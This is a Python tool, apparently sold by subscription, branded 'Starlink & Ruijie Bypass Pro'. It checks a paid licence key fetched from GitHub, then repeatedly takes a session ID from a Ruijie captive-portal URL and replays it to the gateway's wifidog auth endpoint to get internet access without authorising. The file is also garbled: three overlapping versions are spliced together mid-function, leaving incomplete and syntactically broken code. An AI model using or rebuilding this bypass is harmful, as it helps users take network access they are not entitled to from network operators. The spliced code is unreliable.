import os
import re
import sys
import time
import json
import ping3
import aiohttp
import asyncio
import requests
import subprocess
import threading
from datetime import datetime
from urllib.parse import urlparse, parse_qs

# Color codes 
r, g, y, b, w, c = "\033[1;31m", "\033[1;32m", "\033[1;33m", "\033[1;34m", "\033[0m", "\033[1;36m"

# ==================== [ 🔒 HYBRID KEY CHECKER ] ====================
GITHUB_KEYS_URL = "https://raw.githubusercontent.com/Waihlyanhtet/my-python-project/main/keys.txt"
OFFLINE_CACHE_FILE = "key_cache.json"
PROGRAM_RUNNING = True

def load_offline_cache():
    if os.path.exists(OFFLINE_CACHE_FILE):
        try:
            with open(OFFLINE_CACHE_FILE, "r") as f:
                data = json.load(f)
                return data.get("status")
        except:
            pass
    return None

def save_offline_cache(status):
    try:
        with open(OFFLINE_CACHE_FILE, "w") as f:
            json.dump({"status": status, "timestamp": datetime.now().isoformat()}, f)
    except:
        pass

def get_device_identity():
    try:
        user = subprocess.check_output("whoami", shell=True).decode().strip()
        return user
    except Exception:
        return "unknown_device"

def get_current_time_from_server():
    time_urls = [
        "http://worldtimeapi.org/api/timezone/Asia/Yangon",
        "http://worldtimeapi.org/api/timezone/Asia/Bangkok",
    ]
    for url in time_urls:
        try:
            response = requests.get(url, timeout=5)
            if response.status_code == 200:
                data = response.json()
                if 'datetime' in data:
                    dt_str = data['datetime'].split('.')[0]
                    return datetime.strptime(dt_str, "%Y-%m-%dT%H:%M:%S")
        except:
            continue
    return datetime.now()

def check_key_online():
    try:
        response = requests.get(GITHUB_KEYS_URL, timeout=10)
        if response.status_code != 200:
            return None

        dev_id = get_device_identity()
        current_time = get_current_time_from_server()

        for line in response.text.strip().split('\n'):
            line = line.strip()
            if not line or '|' not in line:
                continue
            user_id, expiry_str = line.split('|', 1)
            user_id = user_id.strip()
            expiry_str = expiry_str.strip()

            if user_id == dev_id:
                try:
                    expiry_date = datetime.strptime(expiry_str, "%Y-%m-%d")
                except:
                    try:
                        expiry_date = datetime.strptime(expiry_str, "%Y-%m-%d %H:%M:%S")
                    except:
                        continue

                if current_time > expiry_date:
                    save_offline_cache(False)
                    return False
                else:
                    days_left = (expiry_date - current_time).days
                    result = (expiry_str, days_left)
                    save_offline_cache(result)
                    return result

        save_offline_cache(False)
        return False
    except Exception:
        return None

def check_github_key_hybrid():
    online_result = check_key_online()
    
    if online_result is not None:
        return online_result
    else:
        cached = load_offline_cache()
        if cached is not None:
            return cached
        return None

def force_terminate():
    global PROGRAM_RUNNING
    PROGRAM_RUNNING = False
    print(f"\n{r}╔════════════════════════════════════════╗{w}")
    print(f"{r}║      ACCESS EXPIRED OR REVOKED        ║{w}")
    print(f"{r}║   Your key is no longer valid.        ║{w}")
    print(f"{r}╚════════════════════════════════════════╝{w}")
    os._exit(0)

def background_hybrid_monitor():
    global PROGRAM_RUNNING
    while PROGRAM_RUNNING:
        time.sleep(30)
        if not PROGRAM_RUNNING:
            break
        
        result = check_key_online()
        if result is False:
            force_terminate()
        elif result is not None and isinstance(result, tuple):
            expiry_str, days_left = result
            if days_left < 0:
                force_terminate()

def start_github_monitor():
    monitor_thread = threading.Thread(target=background_hybrid_monitor, daemon=True)
    monitor_thread.start()

# ==================== [ MAIN BYPASS CLASSES ] ====================

TARGET_URL = "https://portal-as.ruijienetworks.com/api/auth/wifidog?stage=portal&gw_id=c4b25b2c5a99&gw_sn=H1TB2WU00735B&gw_address=192.168.110.1&gw_port=2060&ip=192.168.110.119&mac=82:fd:df:49:43:57&slot_num=16&nasip=192.168.1.122&ssid=VLAN233&ustate=0&mac_req=1&url=http%3A%2F%2F192.168.0.1%2F&chap_id=%5C231&chap_challenge=%5C145%5C221%5C077%5C252%5C366%5C000%5C236%5C077%5C227%5C131%5C330%5C276%5C330%5C236%5C360%5C377"

LOG_FILE = "bypass_history.txt"

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def Line():
    try:
        print(f"{y}-\033[1;00m"*os.get_terminal_size()[0])
    except:
        print(f"{y}-"*50)

def Logo():
    clear()
    dev_id = get_device_identity()
    server_time = get_current_time_from_server()
    server_time_str = server_time.strftime('%Y-%m-%d %H:%M:%S')
    
    check_result = check_github_key_hybrid()
    if check_result and isinstance(check_result, tuple):
        expiry_str, days_left = check_result
        status_text = f"{g}Active - {days_left} days left{w}"
        exp_text = expiry_str
    elif check_result is True:
        status_text = f"{g}Active{w}"
        exp_text = "Verified"
    elif check_result is False:
        status_text = f"{r}INVALID/EXPIRED{w}"
        exp_text = "Access Denied"
    else:
        status_text = f"{y}OFFLINE MODE (Cached){w}"
        exp_text = "Using cached key"
    
    logo = f"""{c}
 _    _                               _               
| |  | |                             | |              
| |  | | __ _ _   _ _ __ ___   __ _  | |  _  ___ _ __ 
| |/\| |/ _` | | | | '_ ` _ \ / _` | | |/ // _ \ '__|
\  /\  / (_| | |_| | | | | | | (_| | |   <|  __/ |   
 \/  \/ \__,_|\__, |_| |_| |_|\__,_| |_|\_\\___|_|   
               __/ |                                  
              |___/                                   

        {w}>> {g}STARLINK & RUIJIE BYPASS PRO {w}<<
  {y}--------------------------------------------------
   {w}👤 ID: {g}{dev_id}
   {w}📅 EXP Date: {g}{exp_text}
   {w}⏱️  Status: {status_text}
   {w}🕐 Server Time: {g}{server_time_str}
   {w}🔗 Source: {g}Hybrid (Online + Offline)
  {y}--------------------------------------------------{w}"""
    print(logo)

def write_log(message):
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(f"[{timestamp}] {message}\n")

def parse_target_url(url_string):
    try:
        parsed_url = urlparse(url_string)
        params = parse_qs(parsed_url.query)
        gw_address = params.get('gw_address', ['192.168.110.1'])[0]
        return gw_address, None, None
    except:
        return "192.168.110.1", None, None

class InternetAccess:
    def __init__(self, gw_address):
        Logo()
        self.ip = gw_address
        self.session_url = TARGET_URL
        print(f"\n[+] Active Gateway IP: {self.ip}")
    
    async def main(self):
        await execute(self.session_url, self.ip)

async def get_smart_ping():
    targets = ["google.com", "8.8.8.8", "cloudflare.com"]
    for target in targets:
        ping = await asyncio.to_thread(ping3.ping, target, timeout=2)
        if ping is not None:
            ping_ms = int(ping * 1000)
            if ping_ms >= 100: return f"{r}{ping_ms} ms{w}"
            elif ping_ms >= 70: return f"{y}{ping_ms} ms{w}"
            return f"{g}{ping_ms} ms{w}"
    return f"{r}Offline{w}"

async def get_session_id(session, session_url, previous_session_id):
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    }
    try:
        async with session.get(session_url, headers=headers, allow_redirects=True) as req:
            response = str(req.url)
            session_id = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", response)
            if session_id: 
                return session_id.group(1)
            return False
    except:
        return previous_session_id

async def send(session, ip, session_id):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36',
    }
    params = {'token': session_id, 'phoneNumber': 'HELLO'}
    try:
        async with session.get(f'http://{ip}:2060/wifidog/auth?', params=params, headers=headers, allow_redirects=True) as req:
            response = str(req.url)
            if "baidu.com" in response or "success.html" in response:
                return True
            return False
    except:
        return False

async def execute(session_url, ip):
    timeout = aiohttp.ClientTimeout(total=15)
    connector = aiohttp.TCPConnector(limit=512)
    
    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
        write_log("Internet Bypass service initialized.")
        
        try:
            while True:
                previous_session_id = None
                while True:
                    print(f"{g}[*] Extracting session id...{w}")
                    Line()
                    session_id = await get_session_id(session, session_url, previous_session_id)
                    if session_id:
                        previous_session_id = session_id
                        print(f"{g}[+] Valid Session ID: {session_id}{w}")
                        Line()
                        break
                    else:
                        print(f"{y}[!] Server busy. Retry in 5s...{w}")
                        Line()
                        await asyncio.sleep(5)

                for i in range(3):
                    send_status = await send(session, ip, session_id)
                    ping = await get_smart_ping()
                    
                    if not send_status:
                        print(f"{r}[!] Connection drop! Re-stabilizing...{w}")
                        Line()
                    else:
                        print(f"{g}[+] Connection Stable{w}")
                        Line()
                    
                    print(f"{b}[*] Latency: {ping}{w}")
                    Line()
                    await asyncio.sleep(15)
                
                print(f"{c}[*] Auto-Refreshing Session...{w}")
                write_log("Session refreshed")
                Line()
                await asyncio.sleep(2)
                
        except KeyboardInterrupt:
            write_log("Stopped by user")
            sys.exit(0)
        except Exception as e:
            write_log(f"Crashed: {e}")
            sys.exit(0)

def show_menu():
    print(f"""{c}
  ┌───────────────────────────────────────┐
  │      WAYMAKER ULTRA-PRO STABLE        │
  ├───────────────────────────────────────┤
  │  {w}[1] {g}🚀  Internet Bypass               {c}│
  │  {w}[2] {r}❌  Exit                          {c}│
  └───────────────────────────────────────┘{w}""")

async def main():
    global PROGRAM_RUNNING
    
    initial_check = check_github_key_hybrid()
    
    if initial_check is False:
        Logo()
        print(f"\n{r}╔════════════════════════════════════════╗{w}")
        print(f"{r}║      ACCESS DENIED - INVALID KEY      ║{w}")
        print(f"{r}║   Your device ID is not authorized    ║{w}")
        print(f"{r}╚════════════════════════════════════════╝{w}")
        write_log(f"Access denied for device: {get_device_identity()}")
        sys.exit(0)
    
    start_github_monitor()
    
    gw_address, chap_id, chap_challenge = parse_target_url(TARGET_URL)
    while PROGRAM_RUNNING:
        Logo()
        show_menu()
        choice = input(f"  {y}Choose >>> {w}").strip()
        if choice == '1':
            current_check = check_github_key_hybrid()
            if current_check is False:
                print(f"\n{r}[!] License expired or revoked!{w}")
                write_log("Bypass blocked: License invalid")
                time.sleep(2)
                continue
            access = InternetAccess(gw_address)
            await access.main()
            break 
        elif choice == '2':
            write_log("User exited")
            PROGRAM_RUNNING = False
            sys.exit(0)

if __name__ == "__main__":
    try: 
        asyncio.run(main())
    except KeyboardInterrupt: 
        sys.exit(0)            response = requests.get(url, timeout=5)
            if response.status_code == 200:
                data = response.json()
                if 'datetime' in data:
                    dt_str = data['datetime'].split('.')[0]
                    return datetime.strptime(dt_str, "%Y-%m-%dT%H:%M:%S")
                elif 'dateTime' in data:
                    dt_str = data['dateTime'].split('.')[0]
                    return datetime.strptime(dt_str, "%Y-%m-%dT%H:%M:%S")
        except:
            continue
    return datetime.now()

def check_key_online():
    """Check key from GitHub online - returns (expiry_str, days_left) or False"""
    global LAST_ONLINE_CHECK, CACHED_USER_STATUS
    try:
        response = requests.get(GITHUB_KEYS_URL, timeout=10)
        if response.status_code != 200:
            return None  # online check failed

        dev_id = get_device_identity()
        current_time = get_current_time_from_server()

        for line in response.text.strip().split('\n'):
            line = line.strip()
            if not line or '|' not in line:
                continue
            user_id, expiry_str = line.split('|', 1)
            user_id = user_id.strip()
            expiry_str = expiry_str.strip()

            if user_id == dev_id:
                try:
                    expiry_date = datetime.strptime(expiry_str, "%Y-%m-%d")
                except:
                    try:
                        expiry_date = datetime.strptime(expiry_str, "%Y-%m-%d %H:%M:%S")
                    except:
                        continue

                if current_time > expiry_date:
                    CACHED_USER_STATUS = False
                    save_offline_cache(False)
                    return False
                else:
                    days_left = (expiry_date - current_time).days
                    result = (expiry_str, days_left)
                    CACHED_USER_STATUS = result
                    save_offline_cache(result)
                    return result

        # Device not found in keys
        CACHED_USER_STATUS = False
        save_offline_cache(False)
        return False

    except Exception:
        return None  # online check failed

def check_github_key_hybrid():
    """
    Hybrid check: 
    - Try online first
    - If online fails, use offline cache
    - If offline cache exists, use it
    - If no cache, return None (unknown)
    """
    online_result = check_key_online()
    
    if online_result is not None:
        # Online check succeeded
        return online_result
    else:
        # Online failed - use offline cache
        cached = load_offline_cache()
        if cached is not None:
            if cached is False:
                return False
            elif isinstance(cached, list) or isinstance(cached, tuple):
                # cached format: (expiry_str, days_left)
                return cached
        return None  # No info available

def force_terminate():
    """Force kill the program immediately"""
    global PROGRAM_RUNNING
    PROGRAM_RUNNING = False
    print(f"\n{r}╔════════════════════════════════════════╗{w}")
    print(f"{r}║      ACCESS EXPIRED OR REVOKED        ║{w}")
    print(f"{r}║   Your key is no longer valid.        ║{w}")
    print(f"{r}╚════════════════════════════════════════╝{w}")
    write_log("Program terminated: Key expired or revoked")
    os._exit(0)

def background_hybrid_monitor():
    """Background thread: check online every 30 sec, update cache, kill if expired"""
    global PROGRAM_RUNNING
    while PROGRAM_RUNNING:
        time.sleep(30)
        if not PROGRAM_RUNNING:
            break
        
        result = check_key_online()  # force online check
        if result is False:
            force_terminate()
        elif result is not None and isinstance(result, tuple):
            expiry_str, days_left = result
            if days_left < 0:
                force_terminate()
        # if result is None (offline), keep running with cached status

def start_github_monitor():
    monitor_thread = threading.Thread(target=background_hybrid_monitor, daemon=True)
    monitor_thread.start()

# ==================== [ MAIN BYPASS CLASSES ] ====================

TARGET_URL = "https://portal-as.ruijienetworks.com/api/auth/wifidog?stage=portal&gw_id=c4b25b2c5a99&gw_sn=H1TB2WU00735B&gw_address=192.168.110.1&gw_port=2060&ip=192.168.110.119&mac=82:fd:df:49:43:57&slot_num=16&nasip=192.168.1.122&ssid=VLAN233&ustate=0&mac_req=1&url=http%3A%2F%2F192.168.0.1%2F&chap_id=%5C231&chap_challenge=%5C145%5C221%5C077%5C252%5C366%5C000%5C236%5C077%5C227%5C131%5C330%5C276%5C330%5C236%5C360%5C377"

LOG_FILE = "bypass_history.txt"

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def Line():
    print(f"{y}-\033[1;00m"*os.get_terminal_size()[0])

def Logo():
    clear()
    dev_id = get_device_identity()
    server_time = get_current_time_from_server()
    server_time_str = server_time.strftime('%Y-%m-%d %H:%M:%S')
    
    check_result = check_github_key_hybrid()
    if check_result and isinstance(check_result, tuple):
        expiry_str, days_left = check_result
        status_text = f"{g}Active - {days_left} days left{w}"
        exp_text = expiry_str
    elif check_result is True:
        status_text = f"{g}Active{w}"
        exp_text = "Verified"
    elif check_result is False:
        status_text = f"{r}INVALID/EXPIRED{w}"
        exp_text = "Access Denied"
    else:
        status_text = f"{y}OFFLINE MODE (Cached){w}"
        exp_text = "Using cached key"
    
    logo = rf"""{c}
 _    _                               _               
| |  | |                             | |              
| |  | | __ _ _   _ _ __ ___   __ _  | |  _  ___ _ __ 
| |/\| |/ _` | | | | '_ ` _ \ / _` | | |/ // _ \ '__|
\  /\  / (_| | |_| | | | | | | (_| | |   <|  __/ |   
 \/  \/ \__,_|\__, |_| |_| |_|\__,_| |_|\_\\___|_|   
               __/ |                                  
              |___/                                   

        {w}>> {g}STARLINK & RUIJIE BYPASS PRO {w}<<
  {y}--------------------------------------------------
   {w}👤 ID: {g}{dev_id}
   {w}📅 EXP Date: {g}{exp_text}
   {w}⏱️  Status: {status_text}
   {w}🕐 Server Time: {g}{server_time_str}
   {w}🔗 Source: {g}Hybrid (Online + Offline)
   {w}Status: {g}Premium Bypass tg - @waymaker0456
  {y}--------------------------------------------------{w}"""
    print(logo)

def write_log(message):
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(f"[{timestamp}] {message}\n")

def parse_target_url(url_string):
    try:
        parsed_url = urlparse(url_string)
        params = parse_qs(parsed_url.query)
        gw_address = params.get('gw_address', ['192.168.110.1'])[0]
        chap_id = params.get('chap_id', [None])[0]
        chap_challenge = params.get('chap_challenge', [None])[0]
        return gw_address, chap_id, chap_challenge
    except:
        return "192.168.110.1", None, None

class InternetAccess:
    def __init__(self, gw_address):
        Logo()
        self.ip = gw_address
        self.session_url = TARGET_URL
        print(f"\n[+] Active Gateway IP: {self.ip}")
    
    async def main(self):
        await execute(self.session_url, self.ip)

async def get_smart_ping():
    targets = ["google.com", "8.8.8.8", "cloudflare.com"]
    for target in targets:
        ping = await asyncio.to_thread(ping3.ping, target, timeout=2)
        if ping is not None:
            ping_ms = int(ping * 1000)
            if ping_ms >= 100: return f"{r}{ping_ms} ms{w}"
            elif ping_ms >= 70: return f"{y}{ping_ms} ms{w}"
            return f"{g}{ping_ms} ms{w}"
    return f"{r}Offline{w}"

async def get_session_id(session, session_url, previous_session_id):
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    }
    try:
        async with session.get(session_url, headers=headers, allow_redirects=True) as req:
            response = str(req.url)
            session_id = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", response)
            if session_id: return session_id.group(1)
            return False
    except:
        return previous_session_id

async def send(session, ip, session_id):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36',
    }
    params = {'token': session_id, 'phoneNumber': 'HELLO'}
    try:
        async with session.get(f'http://{ip}:2060/wifidog/auth?', params=params, headers=headers, allow_redirects=True) as req:
            response = str(req.url)
            if "baidu.com" in response or "success.html" in response:
                return True
            return False
    except:
        return False

async def execute(session_url, ip):
    timeout = aiohttp.ClientTimeout(total=15)
    connector = aiohttp.TCPConnector(limit=512)
    
    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
        write_log("Internet Bypass service initialized.")
        
        try:
            while True:
                previous_session_id = None
                while True:
                    print(f"{g}[*] Extracting session id...{w}")
                    Line()
                    session_id = await get_session_id(session, session_url, previous_session_id)
                    if session_id:
                        previous_session_id = session_id
                        print(f"{g}[+] Valid Session ID: {session_id}{w}")
                        Line()
                        break
                    else:
                        print(f"{y}[!] Server busy. Retry in 5s...{w}")
                        Line()
                        await asyncio.sleep(5)

                for i in range(3):
                    send_status = await send(session, ip, session_id)
                    ping = await get_smart_ping()
                    
                    if not send_status:
                        print(f"{r}[!] Connection drop! Re-stabilizing...{w}")
                        Line()
                    else:
                        print(f"{g}[+] Connection Stable{w}")
                        Line()
                    
                    print(f"{b}[*] Latency: {ping}{w}")
                    Line()
                    await asyncio.sleep(15)
                
                print(f"{c}[*] Auto-Refreshing Session...{w}")
                write_log("Session refreshed")
                Line()
                await asyncio.sleep(2)
                
        except KeyboardInterrupt:
            write_log("Stopped by user")
            sys.exit(0)
        except Exception as e:
            write_log(f"Crashed: {e}")
            sys.exit(0)

def show_menu():
    print(f"""{c}
  ┌───────────────────────────────────────┐
  │      WAYMAKER ULTRA-PRO STABLE        │
  ├───────────────────────────────────────┤
  │  {w}[1] {g}🚀  Internet Bypass               {c}│
  │  {w}[2] {r}❌  Exit                          {c}│
  └───────────────────────────────────────┘{w}""")

async def main():
    global PROGRAM_RUNNING
    
    initial_check = check_github_key_hybrid()
    
    if initial_check is False:
        Logo()
        print(f"\n{r}╔════════════════════════════════════════╗{w}")
        print(f"{r}║      ACCESS DENIED - INVALID KEY      ║{w}")
        print(f"{r}║   Your device ID is not authorized    ║{w}")
        print(f"{r}║   or subscription has expired.        ║{w}")
        print(f"{r}╚════════════════════════════════════════╝{w}")
        write_log(f"Access denied for device: {get_device_identity()}")
        sys.exit(0)
    
    start_github_monitor()
    
    gw_address, chap_id, chap_challenge = parse_target_url(TARGET_URL)
    while PROGRAM_RUNNING:
        Logo()
        show_menu()
        choice = input(f"  {y}Choose >>> {w}").strip()
        if choice == '1':
            # Re-check before starting bypass
            current_check = check_github_key_hybrid()
            if current_check is False:
                print(f"\n{r}[!] License expired or revoked!{w}")
                write_log("Bypass blocked: License invalid")
                time.sleep(2)
                continue
            access = InternetAccess(gw_address)
            await access.main()
            break 
        elif choice == '2':
            write_log("User exited")
            PROGRAM_RUNNING = False
            sys.exit(0)

if __name__ == "__main__":
    try: 
        asyncio.run(main())
    except KeyboardInterrupt: 
        sys.exit(0)    
    try:
        response = requests.get(GITHUB_KEYS_URL, timeout=15)
        if response.status_code != 200:
        
        dev_id = get_device_identity()
        current_time = get_current_time_from_server()
        
        for line in response.text.strip().split('\n'):
            line = line.strip()
            if not line or '|' not in line:
                continue
            
            user_id, expiry_str = line.split('|', 1)
            user_id = user_id.strip()
            expiry_str = expiry_str.strip()
            
            if user_id == dev_id:
                try:
                    expiry_date = datetime.strptime(expiry_str, "%Y-%m-%d")
                except:
                    try:
                        expiry_date = datetime.strptime(expiry_str, "%Y-%m-%d %H:%M:%S")
                    except:
                        continue
                
                if current_time > expiry_date:
                    LAST_CHECK_RESULT = False
                    LAST_CHECK_TIME = datetime.now()
                    return False
                else:
                    remaining = expiry_date - current_time
                    LAST_CHECK_RESULT = (expiry_str, remaining.days)
                    LAST_CHECK_TIME = datetime.now()
                    return LAST_CHECK_RESULT
        
        LAST_CHECK_RESULT = False
        LAST_CHECK_TIME = datetime.now()
        return False
        
    except Exception:
        return False

def get_device_identity():
    try:
        user = subprocess.check_output("whoami", shell=True).decode().strip()
        return user
    except Exception:
        return "unknown_device"

def get_current_time_from_server():
    """Get current time from time servers"""
    time_urls = [
        "http://worldtimeapi.org/api/timezone/Asia/Yangon",
        "http://worldtimeapi.org/api/timezone/Asia/Bangkok",
        "https://timeapi.io/api/Time/current/zone?timeZone=Asia/Yangon"
    ]
    
    for url in time_urls:
        try:
            response = requests.get(url, timeout=5)
            if response.status_code == 200:
                data = response.json()
                if 'datetime' in data:
                    dt_str = data['datetime'].split('.')[0]
                    return datetime.strptime(dt_str, "%Y-%m-%dT%H:%M:%S")
                elif 'dateTime' in data:
                    dt_str = data['dateTime'].split('.')[0]
                    return datetime.strptime(dt_str, "%Y-%m-%dT%H:%M:%S")
        except:
            continue
    
    return datetime.now()

def force_terminate():
    """Force kill the program immediately"""
    global PROGRAM_RUNNING
    PROGRAM_RUNNING = False
    print(f"\n{r}╔════════════════════════════════════════╗{w}")
    print(f"{r}║      ACCESS EXPIRED OR REVOKED        ║{w}")
    print(f"{r}║   Your key is no longer valid on     ║{w}")
    print(f"{r}║   GitHub server. Program will exit.   ║{w}")
    print(f"{r}╚════════════════════════════════════════╝{w}")
    write_log("Program terminated: Key expired or revoked on GitHub")
    os._exit(0)  # Force exit immediately

def background_github_monitor():
    """Background thread that checks GitHub every 10 seconds and kills program if expired"""
    global PROGRAM_RUNNING
    
    while PROGRAM_RUNNING:
        time.sleep(10)  # Check every 10 seconds for faster response
        
        if not PROGRAM_RUNNING:
            break
            
        check_result = check_github_key_realtime()
        
        if check_result is False:
            # Expired or not found - force kill immediately
            force_terminate()
        elif check_result is not None and isinstance(check_result, tuple):
            expiry_str, days_left = check_result
            if days_left < 0:
                force_terminate()

def start_github_monitor():
    monitor_thread = threading.Thread(target=background_github_monitor, daemon=True)
    monitor_thread.start()

# ==================== [ MAIN BYPASS CLASSES ] ====================

TARGET_URL = "https://portal-as.ruijienetworks.com/api/auth/wifidog?stage=portal&gw_id=c4b25b2c5a99&gw_sn=H1TB2WU00735B&gw_address=192.168.110.1&gw_port=2060&ip=192.168.110.119&mac=82:fd:df:49:43:57&slot_num=16&nasip=192.168.1.122&ssid=VLAN233&ustate=0&mac_req=1&url=http%3A%2F%2F192.168.0.1%2F&chap_id=%5C231&chap_challenge=%5C145%5C221%5C077%5C252%5C366%5C000%5C236%5C077%5C227%5C131%5C330%5C276%5C330%5C236%5C360%5C377"

LOG_FILE = "bypass_history.txt"

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def Line():
    print(f"{y}-\033[1;00m"*os.get_terminal_size()[0])

def Logo():
    clear()
    dev_id = get_device_identity()
    server_time = get_current_time_from_server()
    server_time_str = server_time.strftime('%Y-%m-%d %H:%M:%S')
    
    check_result = check_github_key_realtime()
    if check_result and isinstance(check_result, tuple):
        expiry_str, days_left = check_result
        status_text = f"{g}Active - {days_left} days left{w}"
        exp_text = expiry_str
    elif check_result is True:
        status_text = f"{g}Active{w}"
        exp_text = "Verified"
    else:
        status_text = f"{r}INVALID/EXPIRED{w}"
        exp_text = "Access Denied"
    
    logo = rf"""{c}
 _    _                               _               
| |  | |                             | |              
| |  | | __ _ _   _ _ __ ___   __ _  | |  _  ___ _ __ 
| |/\| |/ _` | | | | '_ ` _ \ / _` | | |/ // _ \ '__|
\  /\  / (_| | |_| | | | | | | (_| | |   <|  __/ |   
 \/  \/ \__,_|\__, |_| |_| |_|\__,_| |_|\_\\___|_|   
               __/ |                                  
              |___/                                   

        {w}>> {g}STARLINK & RUIJIE BYPASS PRO {w}<<
  {y}--------------------------------------------------
   {w}👤 ID: {g}{dev_id}
   {w}📅 EXP Date: {g}{exp_text}
   {w}⏱️  Status: {status_text}
   {w}🕐 Server Time: {g}{server_time_str}
   {w}🔗 Source: {g}GitHub Real-Time
   {w}Status: {g}Premium Bypass tg - @waymaker0456
  {y}--------------------------------------------------{w}"""
    print(logo)

def write_log(message):
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(f"[{timestamp}] {message}\n")

def parse_target_url(url_string):
    try:
        parsed_url = urlparse(url_string)
        params = parse_qs(parsed_url.query)
        gw_address = params.get('gw_address', ['192.168.110.1'])[0]
        chap_id = params.get('chap_id', [None])[0]
        chap_challenge = params.get('chap_challenge', [None])[0]
        return gw_address, chap_id, chap_challenge
    except:
        return "192.168.110.1", None, None

class InternetAccess:
    def __init__(self, gw_address):
        Logo()
        self.ip = gw_address
        self.session_url = TARGET_URL
        print(f"\n[+] Active Gateway IP: {self.ip}")
    
    async def main(self):
        await execute(self.session_url, self.ip)

async def get_smart_ping():
    targets = ["google.com", "8.8.8.8", "cloudflare.com"]
    for target in targets:
        ping = await asyncio.to_thread(ping3.ping, target, timeout=2)
        if ping is not None:
            ping_ms = int(ping * 1000)
            if ping_ms >= 100: return f"{r}{ping_ms} ms{w}"
            elif ping_ms >= 70: return f"{y}{ping_ms} ms{w}"
            return f"{g}{ping_ms} ms{w}"
    return f"{r}Offline{w}"

async def get_session_id(session, session_url, previous_session_id):
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    }
    try:
        async with session.get(session_url, headers=headers, allow_redirects=True) as req:
            response = str(req.url)
            session_id = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", response)
            if session_id: return session_id.group(1)
            return False
    except:
        return previous_session_id

async def send(session, ip, session_id):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36',
    }
    params = {'token': session_id, 'phoneNumber': 'HELLO'}
    try:
        async with session.get(f'http://{ip}:2060/wifidog/auth?', params=params, headers=headers, allow_redirects=True) as req:
            response = str(req.url)
            if "baidu.com" in response or "success.html" in response:
                return True
            return False
    except:
        return False

async def execute(session_url, ip):
    timeout = aiohttp.ClientTimeout(total=15)
    connector = aiohttp.TCPConnector(limit=512)
    
    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
        write_log("Internet Bypass service initialized.")
        
        try:
            while True:
                previous_session_id = None
                while True:
                    print(f"{g}[*] Extracting session id...{w}")
                    Line()
                    session_id = await get_session_id(session, session_url, previous_session_id)
                    if session_id:
                        previous_session_id = session_id
                        print(f"{g}[+] Valid Session ID: {session_id}{w}")
                        Line()
                        break
                    else:
                        print(f"{y}[!] Server busy. Retry in 5s...{w}")
                        Line()
                        await asyncio.sleep(5)

                for i in range(3):
                    send_status = await send(session, ip, session_id)
                    ping = await get_smart_ping()
                    
                    if not send_status:
                        print(f"{r}[!] Connection drop! Re-stabilizing...{w}")
                        Line()
                    else:
                        print(f"{g}[+] Connection Stable{w}")
                        Line()
                    
                    print(f"{b}[*] Latency: {ping}{w}")
                    Line()
                    await asyncio.sleep(15)
                
                print(f"{c}[*] Auto-Refreshing Session...{w}")
                write_log("Session refreshed")
                Line()
                await asyncio.sleep(2)
                
        except KeyboardInterrupt:
            write_log("Stopped by user")
            sys.exit(0)
        except Exception as e:
            write_log(f"Crashed: {e}")
            sys.exit(0)

def show_menu():
    print(f"""{c}
  ┌───────────────────────────────────────┐
  │      WAYMAKER ULTRA-PRO STABLE        │
  ├───────────────────────────────────────┤
  │  {w}[1] {g}🚀  Internet Bypass               {c}│
  │  {w}[2] {r}❌  Exit                          {c}│
  └───────────────────────────────────────┘{w}""")

async def main():
    global PROGRAM_RUNNING
    
    initial_check = check_github_key_realtime()
    
    if initial_check is False:
        Logo()
        print(f"\n{r}╔════════════════════════════════════════╗{w}")
        print(f"{r}║      ACCESS DENIED - INVALID KEY      ║{w}")
        print(f"{r}║   Your device ID is not authorized    ║{w}")
        print(f"{r}║   or subscription has expired.        ║{w}")
        print(f"{r}╚════════════════════════════════════════╝{w}")
        write_log(f"Access denied for device: {get_device_identity()}")
        sys.exit(0)
    
    start_github_monitor()
    
    gw_address, chap_id, chap_challenge = parse_target_url(TARGET_URL)
    while PROGRAM_RUNNING:
        Logo()
        show_menu()
        choice = input(f"  {y}Choose >>> {w}").strip()
        if choice == '1':
            if check_github_key_realtime() is False:
                print(f"\n{r}[!] License expired or revoked!{w}")
                write_log("Bypass blocked: License invalid")
                time.sleep(2)
                continue
            access = InternetAccess(gw_address)
            await access.main()
            break 
        elif choice == '2':
            write_log("User exited")
            PROGRAM_RUNNING = False
            sys.exit(0)

if __name__ == "__main__":
    try: 
        asyncio.run(main())
    except KeyboardInterrupt: 
        sys.exit(0)
